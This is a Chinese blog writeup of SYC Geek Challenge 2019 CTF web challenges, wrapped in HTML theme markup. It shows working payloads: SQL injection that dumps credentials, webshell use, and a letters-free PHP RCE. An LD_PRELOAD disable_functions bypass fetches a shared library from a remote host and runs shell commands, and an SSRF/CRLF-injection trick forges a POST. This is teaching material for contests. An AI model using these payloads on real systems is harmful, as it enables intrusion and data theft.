@@ -1,0 +1,1445 @@
+<!DOCTYPE html>
+<html>
+<head hexo-theme='https://github.com/volantis-x/hexo-theme-volantis/releases/tag/3.0.0'>
+  <meta charset="utf-8">
+  <!-- SEO相关 -->
+  
+    
+  
+  <!-- 渲染优化 -->
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <!-- 页面元数据 -->
+  
+  <title>SYC极客大挑战writeup - 明月归的小站</title>
+  
+    <meta name="keywords" content="ctf,wp,SYC">
+  
+
+  
+    <meta name="description" content="听学长说这里的题还挺简单的，便过来做了做，总结一下吧！">
+  
+
+  <!-- feed -->
+  
+
+  <!-- import meta -->
+  
+
+  <!-- link -->
+  
+    
+<link rel="stylesheet" href="/static/js-css/all.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/static/js-css/font-awesome-animation.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/static/js-css/jquery.fancybox.min.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="/static/js-css/waves.min.css">
+
+  
+
+  
+
+  
+
+  
+
+  <!-- import link -->
+  
+
+  
+  
+    
+<link rel="stylesheet" href="/css/style.css">
+
+  
+
+  
+  
+</head>
+
+<body>
+  
+  
+  
+  <div class="cover-wrapper">
+    <cover class='cover post' style="display: none;">
+      <div class='cover-body'>
+  <div class='a'>
+    
+    
+    
+  </div>
+  <div class='b'>
+    <div class='menu navigation dock'>
+      <div class='list-h'>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+      <div class="scroll-down" style="display: none;"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
+    </cover>
+    <header class="l_header shadow blur">
+  <div class='container'>
+  <div class='wrapper'>
+    <div class='nav-sub'>
+      <p class="title"></p>
+      <ul class='switcher nav-list-h m-phone' id="pjax-header-nav-list">
+        <li><a class="s-comment fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+          <li><a class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+      </ul>
+    </div>
+		<div class="nav-main">
+      
+        
+        <a class="title flat-box" target="_self" href='/'>
+          
+          
+          
+        </a>
+      
+
+			<div class='menu navigation'>
+				<ul class='nav-list-h m-pc'>
+          
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+          
+				</ul>
+			</div>
+
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <i class="icon fas fa-search fa-fw"></i>
+          <input type="text" class="input u-search-input" placeholder="Search..." />
+        </form>
+      </div>
+
+			<ul class='switcher nav-list-h m-phone'>
+				
+					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
+				
+				<li>
+          <a class="s-menu fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a>
+          <ul class="menu-phone list-v navigation white-box">
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+            
+          </ul>
+        </li>
+			</ul>
+		</div>
+	</div>
+  </div>
+</header>
+
+  </div>
+  
+
+
+  <div class="l_body nocover">
+    <div class='body-wrapper' id="pjax-container">
+      
+        <!--此文件用来存放一些不方便取值的变量--> 
+<!--思路大概是将值藏到重加载的区域内--> 
+ 
+ 
+ 
+<div id="pjax-data" style="display: none"> 
+  <div id="pjax-ispage">true</div> 
+  <div id="pjax-pageTitle">SYC极客大挑战writeup</div> 
+  <div id="pjax-enable-cover">true</div> 
+  <div id="pjax-comment-path">none</div> 
+  <div id="pjax-comment-placeholder">none</div> 
+</div> 
+ 
+ 
+<script> 
+  // 处理封面 此时 jquery 还没加载 
+  if ("none" == "none") { // 移除封面 
+    document.getElementsByClassName('cover')[0].style.display = "none"; 
+    document.getElementsByClassName('l_body')[0].classList.add("nocover"); 
+    document.getElementsByClassName('l_header', 'cover-wrapper')[0].classList.add("show"); 
+  } else { 
+    if ("none" == "blog") { // 半屏 
+      document.getElementsByClassName('cover')[0].classList.remove("full"); 
+      document.getElementsByClassName('cover')[0].classList.add("half"); 
+      document.getElementsByClassName('scroll-down')[0].style.display = "none"; 
+    } else if ("none" == "docs") { // 全屏 
+      document.getElementsByClassName('cover')[0].classList.remove("half"); 
+      document.getElementsByClassName('cover')[0].classList.add("full"); 
+      document.getElementsByClassName('scroll-down')[0].style.display = ""; 
+    } 
+    document.getElementsByClassName('cover')[0].style.display = ""; 
+    document.getElementsByClassName('l_body', 'show')[0].classList.remove("nocover"); 
+    document.getElementsByClassName('l_header', 'cover-wrapper')[0].classList.remove("show"); 
+  } 
+</script> 
+
+      
+      
+
+<div class='l_main'>
+  
+
+  
+    <article id="post" class="post white-box reveal shadow article-type-post" itemscope itemprop="blogPost">
+      
+
+
+  <section class='meta'>
+    
+      
+      
+      <div class="meta" id="header-meta">
+        
+          
+  <h1 class="title">
+    <a href="/2019/11/06/%E6%AF%94%E8%B5%9B/2019/syc-ctf-wp/">
+      SYC极客大挑战writeup
+    </a>
+  </h1>
+
+
+        
+        <div class='new-meta-box'>
+          
+            
+          
+            
+              
+<div class='new-meta-item author'>
+  <a class='author' href="/" rel="nofollow">
+    <img no-lazy src="/pic/youxiang.jpg">
+    <p>MoonBack</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+            
+              <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：2019年11月6日</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+  <div class="new-meta-item wordcount">
+    <a class='notlink'>
+      <i class="fas fa-keyboard fa-fw" aria-hidden="true"></i>
+      <p>字数：4k字</p>
+    </a>
+  </div>
+  <div class="new-meta-item readtime">
+    <a class='notlink'>
+      <i class="fas fa-hourglass-half fa-fw" aria-hidden="true"></i>
+      <p>时长：18分钟</p>
+    </a>
+  </div>
+
+
+            
+          
+            
+              
+  <div class="new-meta-item browse valine">
+    <a class='notlink'>
+      <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
+      
+      <span id="/2019/11/06/%E6%AF%94%E8%B5%9B/2019/syc-ctf-wp/" class="leancloud_visitors" data-flag-title="SYC极客大挑战writeup">
+      <p>
+        <span class="leancloud-visitors-count"></span>
+      </p>
+      </span>
+    </a>
+  </div>
+
+
+            
+          
+            
+              
+<div class="new-meta-item comments-count">
+  
+  <a href="/2019/11/06/%E6%AF%94%E8%B5%9B/2019/syc-ctf-wp/#comments">
+    <i class="fas fa-comment-dots fa-fw"></i>
+    <span class="valine-comment-count" data-xid="/2019/11/06/%E6%AF%94%E8%B5%9B/2019/syc-ctf-wp/">0</span>
+    <span class="leancloud-comments-count">&nbsp;</span>
+  </a>
+</div>
+
+
+            
+          
+            
+              
+
+            
+          
+        </div>
+        
+          <hr>
+        
+      </div>
+    
+  </section>
+
+
+      <section class="article typo">
+        <div class="article-entry" itemprop="articleBody">
+          
+          
+          <p>听学长说这里的题还挺简单的，便过来做了做，总结一下吧！</p>
+<a id="more"></a>
+
+<h2 id="打比赛之前先撸一只猫！"><a href="#打比赛之前先撸一只猫！" class="headerlink" title="打比赛之前先撸一只猫！"></a>打比赛之前先撸一只猫！</h2><p>查看源代码，发现</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$cat&#x3D;$_GET[&#39;cat&#39;];</span><br><span class="line">echo $cat;</span><br><span class="line">if($cat&#x3D;&#x3D;&#39;dog&#39;)&#123;</span><br><span class="line">    echo &#39;Syc&#123;cat_cat_cat_cat&#125;&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>get传参就行</p>
+<pre><code>?cat=dog
+
+
+Syc&#123;I_actu4l1y_Lik3_d0gs&#125; </code></pre>
+<h2 id="你看见过我的菜刀么"><a href="#你看见过我的菜刀么" class="headerlink" title="你看见过我的菜刀么"></a>你看见过我的菜刀么</h2><p>打开网页发现    </p>
+<pre><code>eval($_POST[&quot;Syc&quot;]);</code></pre>
+<p>蚁剑直接连就行，发现根目录里有flag文件夹，打开发现flag.txt文件，查看得到flag</p>
+<pre><code>Syc&#123;Upl0ad_f1l3_i5_daNger0us&#125;</code></pre>
+<h2 id="BurpSuiiiiiit"><a href="#BurpSuiiiiiit" class="headerlink" title="BurpSuiiiiiit!!!"></a>BurpSuiiiiiit!!!</h2><p>下载过来是个.jar文件，bp导入即可</p>
+<p><img src="/2019/11/06/%E6%AF%94%E8%B5%9B/2019/syc-ctf-wp/20191108193033.png"></p>
+<p>在Errors可以看到flag</p>
+<pre><code>Syc&#123;BurpExtender_Are_guns_F0r_Hack3rs&#125;</code></pre>
+<h2 id="性感潇文清，在线算卦"><a href="#性感潇文清，在线算卦" class="headerlink" title="性感潇文清，在线算卦"></a>性感潇文清，在线算卦</h2><p>查看源代码发现</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$savepath &#x3D; &quot;uploads&#x2F;&quot; . sha1($_SERVER[&#39;REMOTE_ADDR&#39;]) . &quot;&#x2F;&quot;;</span><br><span class="line">if (!is_dir($savepath)) &#123;</span><br><span class="line">    $oldmask &#x3D; umask(0);</span><br><span class="line">    mkdir($savepath);</span><br><span class="line">    umask($oldmask);</span><br><span class="line">&#125;</span><br><span class="line">if ((@$_GET[&#39;u&#39;]) &amp;&amp; (@$_GET[&#39;p&#39;])) &#123;</span><br><span class="line">    $content &#x3D; &#39;***************&#39;;</span><br><span class="line">    file_put_contents(&quot;$savepath&quot; . sha1($_GET[&#39;u&#39;]), $content);</span><br><span class="line">    $msg &#x3D; &#39;Ding!你的算卦结果就在这儿啦！ &#39; . $savepath . htmlspecialchars(sha1($_GET[&#39;u&#39;])) . &quot;&quot;;</span><br><span class="line">    echo $msg;</span><br><span class="line">    usleep(100000);</span><br><span class="line">    @$content &#x3D; &quot;you are too slow&quot;;</span><br><span class="line">    file_put_contents(&quot;$savepath&quot; . sha1($_GET[&#39;u&#39;]), $content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>提示用条件竞争</p>
+<p>这段代码的意思就是根据你的ip，对其sha1加密，并创建这个文件夹。</p>
+<p>然后GET方式接收两个参数，将传过来的u进行sha1加密，并创建该文件，里面写如$content（目测flag)，然后程序睡眠100000微秒，一微秒等于百万分之一秒，大概是0.1s，看到这就用竞争了</p>
+<p>由于你的ip地址不变，如果请求的u不变的话，那么文件url是固定的</p>
+<p>bp开两个intruder，一个是让它生成文件，一个访问文件</p>
+<p><img src="/2019/11/06/%E6%AF%94%E8%B5%9B/2019/syc-ctf-wp/20191108195656.png"></p>
+<pre><code>Syc&#123;You-4re-S0-f4st&#125;</code></pre>
+<h2 id="Easysql"><a href="#Easysql" class="headerlink" title="Easysql"></a>Easysql</h2><p>这题是多次试出来的</p>
+<p>先在用户名加个<code>&#39;</code></p>
+<p>发现报错信息</p>
+<p><img src="/2019/11/06/%E6%AF%94%E8%B5%9B/2019/syc-ctf-wp/20191109215357.png"></p>
+<p>分析一下报错信息，猜测后台sql语句为<code>&#39;$username&#39;</code></p>
+<p>payload:</p>
+<pre><code>用户名处： admin&#39; or 1#
+
+Syc&#123;sqL_inj3cti0n_1s_re4lly_fUn&#125;</code></pre>
+<h2 id="RCE-me"><a href="#RCE-me" class="headerlink" title="RCE me"></a>RCE me</h2><p>这道题考察的是无字母数字绕过 + disable_fuction绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#39;code&#39;]))&#123;</span><br><span class="line">        $code&#x3D;$_GET[&#39;code&#39;];</span><br><span class="line">            if(strlen($code)&gt;40)&#123;</span><br><span class="line">                    die(&quot;This is too Long.&quot;);</span><br><span class="line">                    &#125;</span><br><span class="line">            if(preg_match(&quot;&#x2F;[A-Za-z0-9]+&#x2F;&quot;,$code))&#123;</span><br><span class="line">                    die(&quot;NO.&quot;);</span><br><span class="line">                    &#125;</span><br><span class="line">            @eval($code);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(__FILE);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; ?&gt;</span><br></pre></td></tr></table></figure>
+<p>这道题可能看着很熟悉，可以看下我这篇博客<a href="http://www.moonback.xyz/2019/10/16/nowords-webshell/">http://www.moonback.xyz/2019/10/16/nowords-webshell/</a></p>
+<p>但这道题并不是那种思路</p>
+<p>先看下phpinfo吧</p>
+<pre><code>http://114.116.44.23:40001/?code=$_=%22%23./|&#123;%22^%22|~`//%22;$&#123;$_&#125;[_]();
+POST    _=phpinfo</code></pre>
+<p>或者直接用<strong>异或</strong>或者<strong>取反</strong>构造也行，并且发现好像只能传POST两个参数</p>
+<p>看一下目录，发现有flag文件和readflag，猜测flag是直接读不了的，必须运行readflag才能</p>
+<p><img src="/2019/11/06/%E6%AF%94%E8%B5%9B/2019/syc-ctf-wp/20191106162901.png"></p>
+<p>发现能执行系统命令的函数基本都过滤了</p>
+<p><img src="/2019/11/06/%E6%AF%94%E8%B5%9B/2019/syc-ctf-wp/20191106153907.png"></p>
+<p>这里就用<code>LD_PRELOAD</code>来绕过了</p>
+<pre><code>?code=$_=$&#123;~%A0%AF%B0%AC%AB&#125;[_];$_($&#123;~%A0%AF%B0%AC%AB&#125;[__]);</code></pre>
+<p>利用这个payload，<code>_</code>传<code>assert</code>(不知道为啥eval不行),<code>__</code>传恶意代码</p>
+<p><strong>第一步</strong>，先往服务器上传一个<code>.so</code>共享库文件，可以放在/tmp目录下因，为这个路径默认权限是777，可以使用</p>
+<pre><code>file_put_contents(&quot;/tmp/bypass_disablefunc_x64.so&quot;,file_get_contents(&quot;http://****/bypass_disablefunc_x64.so&quot;))</code></pre>
+<p>或者用copy函数</p>
+<pre><code>copy(&quot;http://******/bypass_disablefunc_x64.so&quot;,&quot;/tmp/bypass_disablefunc_x64.so&quot;)</code></pre>
+<p><strong>第二步</strong>，向/tmp目录下写入一个php文件</p>
+<pre><code>file_put_contents(&quot;/tmp/moonback&quot;,&quot;&lt;?php putenv(&#39;EVIL_CMDLINE=&#39;.&#39;cd /%26%26./readflag &gt; /tmp/moonback1 2&gt;%261&#39;);putenv(&#39;LD_PRELOAD=&#39;.&#39;/tmp/bypass_disablefunc_x64.so&#39;);mail(&#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;);?&gt;&quot;);</code></pre>
+<p>其内容写入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">putenv(&#39;EVIL_CMDLINE&#x3D;&#39;.&#39;cd &#x2F;%26%26.&#x2F;readflag &gt; &#x2F;tmp&#x2F;moonback1 2&gt;%261&#39;);			&#x2F;&#x2F;EVIL_CMDLINE&#x3D;shell命令，并将结果输出到一个文件</span><br><span class="line">putenv(&#39;LD_PRELOAD&#x3D;&#39;.&#39;&#x2F;tmp&#x2F;bypass_disablefunc_x64.so&#39;);	&#x2F;&#x2F;LD_PRELOAD&#x3D;动态加载库的位置</span><br><span class="line">mail(&#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;);		&#x2F;&#x2F;用mail函数触发</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>这个内容的<code>&amp;</code>符号要url编码%26</p>
+<p><strong>第三步</strong>，包含文件，查看输出结果</p>
+<pre><code>include(&#39;/tmp/moonback&#39;)
+
+var_dump(file_get_contents(&#39;/tmp/moonback1&#39;))</code></pre>
+<p>成功解题</p>
+<h2 id="李三的代码审计笔记第一页"><a href="#李三的代码审计笔记第一页" class="headerlink" title="李三的代码审计笔记第一页"></a>李三的代码审计笔记第一页</h2><p>这题并没有神魔漏洞，只需在自己服务器上每次访问让它返回不一样的东西就行</p>
+<p>可以用flask简单搭一个</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import	flask </span><br><span class="line">import	datetime</span><br><span class="line">server&#x3D;flask.Flask(__name__) </span><br><span class="line">data&#x3D;&quot;If I knew	where I	would die, I would never go there.&quot; </span><br><span class="line">data&#x3D;data.split(&quot;	&quot;) </span><br><span class="line">data.reverse()</span><br><span class="line">server.route(&#39;&#x2F;&#39;,methods&#x3D;[&#39;post&#39;,&#39;get&#39;]) </span><br><span class="line">def	index():				</span><br><span class="line">	return	data.pop()</span><br><span class="line">server.run(port&#x3D;9999)</span><br></pre></td></tr></table></figure>
+
+<h2 id="服务端检测系统"><a href="#服务端检测系统" class="headerlink" title="服务端检测系统"></a>服务端检测系统</h2><p>访问题目，查看源码，发现<code>admin.php</code>，访问显示127.0.0.1才能访问，说明admin.php需要<code>index.php</code> ssrf</p>
+<p>在源码发现这个</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">    if(isset($_POST[&#39;method&#39;]) &amp;&amp; isset($_POST[&#39;url&#39;]) )&#123;</span><br><span class="line">        $method&#x3D;$_POST[&#39;method&#39;];</span><br><span class="line">        $url&#x3D;$_POST[&#39;url&#39;];</span><br><span class="line"></span><br><span class="line">        if(preg_match(&#39;&#x2F;^http:\&#x2F;\&#x2F;&#x2F;i&#39;,$url))&#123;</span><br><span class="line">            $opts &#x3D; array(</span><br><span class="line">                &#39;http&#39;&#x3D;&gt;array(</span><br><span class="line">                    &#39;method&#39;&#x3D;&gt;$method,</span><br><span class="line">                    &#39;timeout&#39;&#x3D;&gt;3</span><br><span class="line">                )</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">            $context &#x3D; stream_context_create($opts);</span><br><span class="line">            $body &#x3D; @file_get_contents($url.&quot;&#x2F;anything&quot;, false, $context);</span><br><span class="line"></span><br><span class="line">            if(isset($http_response_header))&#123;</span><br><span class="line">                preg_match(&quot;&#x2F;Allow:(.*?);&#x2F;i&quot;,implode(&#39;;&#39;,$http_response_header).&quot;;&quot;,$matches);</span><br><span class="line">                if(isset($matches[1]))&#123;</span><br><span class="line">                    echo &quot;服务端支持的请求方法有:&quot;.$matches[1];</span><br><span class="line">                &#125;else&#123;</span><br><span class="line">                    echo &quot;failed&lt;br&gt;&quot;;</span><br><span class="line">                    echo sprintf(&quot;body length of $method%d&quot;, $body);</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                echo &quot;error&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &#39;not allowed&#39;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+<p>method和url可控，url必须是<code>http://</code>开头</p>
+<p>输入的url会拼接上<code>/anything</code>然后以options请求方法访问，一次得到Allow返回头</p>
+<p>不过<code>sprintf(&quot;body    length    of    $method%d&quot;,    $body);</code>这句代码有错误 </p>
+<p>因为格式化字符串<code>&quot;body    length    of    $method%d&quot;</code>可控，所以只要把%d给转义掉，再注入%s，就能让其显示$body内容，</p>
+<p>例如$method传入<code>%s%</code>，那么最后拼接成的便是<code>body length of %s%%d</code>，而最后显示的效果就是<code>body length    of 返回的数据%d</code></p>
+<p><img src="/2019/11/06/%E6%AF%94%E8%B5%9B/2019/syc-ctf-wp/20191117215230.png"></p>
+<p>再通过ssrf POST一个<code>iwantflag=yes</code>，但是怎末POST呢？</p>
+<p>发现这里用的是<code>file_get_context_create()</code>函数来发起HTTP请求，一些配置选项包括这里的请求方式是作为一个数组经过<code>stream_context_create()</code>处理后传入的。其实这里就存在<code>CRLF注入漏洞</code>，即我们可以完全自己构造一个完整的POST包发出去</p>
+<p>具体如下：</p>
+<p><img src="/2019/11/06/%E6%AF%94%E8%B5%9B/2019/syc-ctf-wp/20191117220802.png"></p>
+<p><code>iwantflag=yes%26b=%s%</code>中的<code>%26</code>是&amp;的url编码，这里是必须要编码的，否则就被当做当前面请求包的参数分割符了</p>
+<p>还有为什么这里多传了一个b参数，因为观察最终的请求包就知道后面是会被拼接上原本正 常的HTTP请求包中的内容的，所以为了防止干扰iwantflag变量就又加一个变量</p>
+<p>由于我们是要得到返回的数据的，所以最后依然是<code>%s%</code></p>
+<p>请求头中的<code>Content-Length</code>也很重要，和请求包数据实际长度不符是不会得到正确回应的， 所以实际中要自己估量</p>
+<h2 id="Lovelysql"><a href="#Lovelysql" class="headerlink" title="Lovelysql"></a>Lovelysql</h2><p>这题其实是考察联合查询，将请求信息保存成文件，用sqlmap跑下就出来了</p>
+<pre><code>Syc&#123;Ohhh_y0u_foUnd_m3&#125;</code></pre>
+<p>不url编码会报错</p>
+<p><img src="/2019/11/06/%E6%AF%94%E8%B5%9B/2019/syc-ctf-wp/TIM%E6%88%AA%E5%9B%BE20200503113348.png"></p>
+<p>order by判断为3列</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">check.php?username=a%<span class="number">27</span>%<span class="number">20</span>order%<span class="number">20</span>by%<span class="number">204</span>%<span class="number">23</span>&amp;password=adsdas</span><br></pre></td></tr></table></figure>
+
+<p>判断回显列为2，3列</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">check.php?username=a%<span class="number">27</span>%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,<span class="number">2</span>,<span class="number">3</span>%<span class="number">23</span>&amp;password=adsdas</span><br></pre></td></tr></table></figure>
+
+<p>报数据库</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">check.php?username=a%<span class="number">27</span>%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,group_concat(schema_name),<span class="number">3</span>%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span>information_schema.schemata%<span class="number">23</span>&amp;password=adsdas</span><br><span class="line"><span class="comment"># information_schema,test,performance_schema,mysql,geek</span></span><br></pre></td></tr></table></figure>
+
+<p>爆表</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">check.php?username=a%<span class="number">27</span>%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,group_concat(table_name),<span class="number">3</span>%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span>information_schema.tables%<span class="number">20</span>where%<span class="number">20</span>table_schema=<span class="string">&quot;geek&quot;</span>%<span class="number">23</span>&amp;password=adsdas</span><br><span class="line"><span class="comment"># geekuser,l0ve1ysq1</span></span><br></pre></td></tr></table></figure>
+
+<p>爆字段</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">check.php?username=a%<span class="number">27</span>%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,group_concat(column_name),<span class="number">3</span>%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span>information_schema.columns%<span class="number">20</span>where%<span class="number">20</span>table_schema=<span class="string">&quot;geek&quot;</span>%<span class="number">20</span><span class="keyword">and</span>%<span class="number">20</span>table_name=<span class="string">&quot;l0ve1ysq1&quot;</span>%<span class="number">23</span>&amp;password=adsdas</span><br><span class="line"><span class="comment"># id,username,password</span></span><br></pre></td></tr></table></figure>
+
+<p>爆内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">check.php?username=a%<span class="number">27</span>%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,group_concat(id,<span class="number">0x23</span>,username,<span class="number">0x23</span>,password),<span class="number">3</span>%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span>geek.l0ve1ysq1%<span class="number">23</span>&amp;password=adsdas</span><br><span class="line"><span class="comment"># 成功爆出flag</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="性感黄阿姨，在线聊天"><a href="#性感黄阿姨，在线聊天" class="headerlink" title="性感黄阿姨，在线聊天"></a>性感黄阿姨，在线聊天</h2><p>发送flag，抓包看到</p>
+<p><img src="/2019/11/06/%E6%AF%94%E8%B5%9B/2019/syc-ctf-wp/20191115230427.png"></p>
+<p>将guest改成admin发现</p>
+<p><img src="/2019/11/06/%E6%AF%94%E8%B5%9B/2019/syc-ctf-wp/20191115230615.png"></p>
+<p>给了个提示，<code>name=md5($flag)</code>，这里就用到弱类型了，即数字和字符串比较时，字符串会先转换成数字，猜测$flag加密后前几位是数字，bp爆破，爆破的内容为name</p>
+<p><img src="/2019/11/06/%E6%AF%94%E8%B5%9B/2019/syc-ctf-wp/20191115231212.png"></p>
+<p>发现为<code>paload=357</code>时，有个提示</p>
+<p><img src="/2019/11/06/%E6%AF%94%E8%B5%9B/2019/syc-ctf-wp/20191115231741.png"></p>
+<p>访问发现神魔都没有，并且提示里让我们读这个文件，况且题目考察的点有xxe</p>
+<p>再返回那个POST请求，之前提交的是json格式的，那是否能提交xml格式的那？</p>
+<p><img src="/2019/11/06/%E6%AF%94%E8%B5%9B/2019/syc-ctf-wp/20191115232948.png"></p>
